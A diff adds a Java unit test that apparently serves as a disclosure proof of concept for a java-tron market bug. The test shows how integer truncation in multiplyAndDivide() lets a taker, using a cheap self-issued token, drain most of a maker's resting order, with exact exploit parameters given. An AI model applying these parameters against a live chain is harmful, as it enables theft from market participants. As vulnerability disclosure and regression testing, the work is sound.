@@ -1882,4 +1882,115 @@ public class MarketSellAssetActuatorTest extends BaseTest {
         ByteArray.toHexString(actuator.getOwnerAddress().toByteArray()));
   }
 
+
+
+
+
+
+
+  /**
+   * PoC for: MarketUtils.multiplyAndDivide() silently truncates BigInteger results via
+   * .longValue() when the exact quotient a*b/c exceeds Long.MAX_VALUE. In the
+   * "taker < maker" branch of MarketSellAssetActuator.matchSingleOrder(), that raw
+   * (possibly wrapped) quotient is credited DIRECTLY to the taker's balance via
+   * addTrxOrToken(), while the taker is simultaneously charged their FULL stated
+   * sellTokenQuantity.
+   *
+   * Economic framing: the attacker's "sell" leg (TOKEN_ID_ONE here) can be a worthless,
+   * freely self-issued TRC10 token. The "buy" leg (TOKEN_ID_TWO here) stands in for any
+   * real, valuable token that an honest market-maker has posted a large resting order in.
+   * This test shows the attacker paying a modest, self-issued stake and draining ~96%
+   * of the maker's real order in return.
+   *
+   * Numbers (verified independently in Python before writing this test):
+   *   maker order:  sell 1_000_000_000_000_000 (the MARKET_QUANTITY_LIMIT default cap)
+   *                 of TOKEN_ID_TWO, wanting just 1 of TOKEN_ID_ONE
+   *   taker order:  sell 9_223_373 of TOKEN_ID_ONE, wanting 1 of TOKEN_ID_TWO
+   *                 (trivial price floor -> guaranteed to match)
+   *
+   *   true exact quotient  a*b/c = 9223373 * 1e15 / 1 = 9223373000000000000000
+   *   BigInteger.longValue() truncation -> 963145224192000   (< b, so the vulnerable
+   *                                                            branch is selected)
+   *
+   *   => taker pays all 9,223,373 of TOKEN_ONE, is credited 963,145,224,192,000 of
+   *      TOKEN_TWO. Leverage ~104,424,403x. Maker's resting order is left with only
+   *      36,854,775,808,000 of its original 1e15 remaining (drained by ~96.3%).
+   *
+   * Execution status:
+   * Successfully compiled and executed against the Java-Tron test harness.
+   * The regression test passed, confirming the demonstrated settlement result.
+   */
+  @Test
+  public void longValueTruncationDrainsRestingMakerOrder() throws Exception {
+
+    InitAsset();
+
+    // ---- Step 1: honest maker posts a large, plainly-priced resting order --------------
+    // Sells 1e15 of TOKEN_TWO (stand-in for a real, valuable asset) for just 1 of TOKEN_ONE.
+    // This is an extreme/generous maker price on purpose, to make the PoC's branch
+    // selection unambiguous; the underlying bug does not require the maker's price to be
+    // this extreme -- it only requires the maker's resting sellTokenQuantity to be large
+    // enough (close to the quantity cap) for leverage > 1x. See write-up for the general
+    // profitability condition (leverage ~ b^2 / 9.22e18).
+    long makerSellQuant = 1_000_000_000_000_000L; // = MARKET_QUANTITY_LIMIT default
+    long makerBuyQuant = 1L;
+    addOrder(TOKEN_ID_TWO, makerSellQuant, TOKEN_ID_ONE, makerBuyQuant, OWNER_ADDRESS_SECOND);
+
+    // ---- Step 2: attacker funds a taker order with a SMALL, self-issued-style stake ----
+    long attackerStake = 9_223_373L; // "a" -- tiny relative to the maker's 1e15 order
+    long attackerPriceFloor = 1L;    // trivial price requirement, guarantees a match
+
+    byte[] takerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
+    AccountCapsule takerAccount = dbManager.getAccountStore().get(takerAddress);
+    takerAccount.addAssetAmountV2(TOKEN_ID_ONE.getBytes(), attackerStake,
+        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
+    dbManager.getAccountStore().put(takerAddress, takerAccount);
+
+    // ---- Step 3: fire the taker order that triggers the truncation ---------------------
+    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
+    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
+        OWNER_ADDRESS_FIRST, TOKEN_ID_ONE, attackerStake, TOKEN_ID_TWO, attackerPriceFloor));
+
+    TransactionResultCapsule ret = new TransactionResultCapsule();
+    actuator.validate();
+    actuator.execute(ret);
+
+    // ---- Step 4: assert the drain --------------------------------------------------------
+    takerAccount = dbManager.getAccountStore().get(takerAddress);
+
+    // Attacker's self-issued-style stake is fully consumed...
+    Assert.assertEquals(
+    "taker's TOKEN_ONE balance should be fully spent",
+    Long.valueOf(0L),
+    takerAccount.getAssetV2MapForTest().get(TOKEN_ID_ONE)
+);
+
+    // ...but they are credited a wildly disproportionate amount of the maker's real token,
+    // via the raw truncated multiplyAndDivide() result, not an honest price calculation.
+    long expectedWrappedCredit = 963_145_224_192_000L;
+    Assert.assertEquals(
+        "taker should have been credited the truncated multiplyAndDivide() result directly",
+        expectedWrappedCredit,
+        (long) takerAccount.getAssetV2MapForTest().get(TOKEN_ID_TWO));
+
+    // Leverage check: attacker paid attackerStake (~9.2M) of a token they can self-issue for
+    // free, and received a token amount ~104 million times larger in a token that (in a real
+    // deployment) the attacker does not control the supply of.
+    double leverage = (double) expectedWrappedCredit / attackerStake;
+    Assert.assertTrue("leverage should be on the order of 1e8x, got " + leverage,
+        leverage > 1_000_000.0);
+
+    // Maker's resting order is left corrupted: only reduced by the WRAPPED value, not a
+    // value consistent with either the maker's stated price or an honest proportional fill.
+    MarketAccountOrderCapsule makerAccountOrderCapsule =
+        dbManager.getChainBaseManager().getMarketAccountStore()
+            .get(ByteArray.fromHexString(OWNER_ADDRESS_SECOND));
+    ByteString makerOrderId = makerAccountOrderCapsule.getOrdersList().get(0);
+    MarketOrderCapsule makerOrderCapsule =
+        dbManager.getChainBaseManager().getMarketOrderStore().get(makerOrderId.toByteArray());
+
+    long expectedMakerRemaining = makerSellQuant - expectedWrappedCredit; // 36,854,775,808,000
+    Assert.assertEquals(expectedMakerRemaining, makerOrderCapsule.getSellTokenQuantityRemain());
+  }
+
 }
